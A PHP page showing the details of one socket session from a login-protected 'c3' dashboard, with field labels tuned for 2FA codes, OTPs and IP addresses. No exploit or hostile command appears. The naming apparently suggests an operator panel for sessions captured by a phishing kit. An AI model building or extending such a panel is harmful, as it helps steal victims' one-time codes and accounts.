<?php
// c3_session_detail.php - Session Details Page (NO session_start here)
require_once __DIR__ . '/assets/auth/auth.php';

$auth = new Auth();
$auth->requireLogin();

$socketId = $_GET['socketId'] ?? '';
if (!$socketId) {
    header('Location: c3_dashboard.php');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Session Details</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-light">
    <div class="container mt-4">
        <div class="card">
            <div class="card-header bg-primary text-white">
                <h5>Session Details: <?php echo htmlspecialchars($socketId); ?></h5>
            </div>
            <div class="card-body" id="details"></div>
        </div>
    </div>
    <script>
    function escapeHtml(text) {
        if (text === null || text === undefined) return '';
        const div = document.createElement('div');
        div.textContent = String(text);
        return div.innerHTML;
    }

    function isMeaningfulValue(value) {
        if (value === null || value === undefined) return false;
        if (typeof value === 'string') return value.trim() !== '';
        if (Array.isArray(value)) return value.some(isMeaningfulValue);
        if (typeof value === 'object') return Object.values(value).some(isMeaningfulValue);
        return true;
    }

    function formatFieldLabel(key) {
        return String(key)
            .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
            .replace(/[_-]+/g, ' ')
            .replace(/\b\w/g, char => char.toUpperCase())
            .replace(/\b2 Fa\b/g, '2FA')
            .replace(/\bOtp\b/g, 'OTP')
            .replace(/\bIp\b/g, 'IP')
            .replace(/\bUrl\b/g, 'URL')
            .replace(/\bId\b/g, 'ID');
    }

    function isTimeLikeField(key) {
        return /(?:^|_)(time|date|at|seen|updated|created)$/i.test(String(key))
            || ['created_at', 'last_seen'].includes(String(key));
    }

    function formatValue(key, value) {
        if (isTimeLikeField(key)) {
            const date = new Date(value);
            return escapeHtml(isNaN(date.getTime()) ? 'Unknown' : date.toLocaleString());
        }
        if (typeof value === 'boolean') return value ? 'Yes' : 'No';
        if (Array.isArray(value) || (value && typeof value === 'object')) {
            return `<pre class="mb-0"><code>${escapeHtml(JSON.stringify(value, null, 2))}</code></pre>`;
        }
        return escapeHtml(String(value));
    }

    function collectEntries(session) {
        const entries = [];
        const seen = new Set();
        const sources = [session];

        if (session && session.data && typeof session.data === 'object' && !Array.isArray(session.data)) {
            sources.push(session.data);
        }

        for (const source of sources) {
            if (!source || typeof source !== 'object' || Array.isArray(source)) continue;

            for (const [key, value] of Object.entries(source)) {
                if (key === 'data' || seen.has(key) || !isMeaningfulValue(value)) continue;
                seen.add(key);
                entries.push([key, value]);
            }
        }

        return entries;
    }

    fetch(`/getSession?socketId=<?php echo urlencode($socketId); ?>`)
        .then(r => r.json())
        .then(data => {
            if (!data.success || !data.data) {
                document.getElementById('details').innerHTML = '<div class="alert alert-danger mb-0">No session data found.</div>';
                return;
            }

            const rows = collectEntries(data.data).map(([key, value]) =>
                `<tr><td>${escapeHtml(formatFieldLabel(key))}</td><td>${formatValue(key, value)}</td></tr>`
            ).join('');

            document.getElementById('details').innerHTML = `
                <div class="table-responsive">
                    <table class="table table-striped align-middle mb-0">
                        <thead>
                            <tr><th>Field</th><th>Value</th></tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                </div>
            `;
        })
        .catch(error => {
            document.getElementById('details').innerHTML = '<div class="alert alert-danger mb-0">' + escapeHtml(error.message) + '</div>';
        });
    </script>
</body>
</html>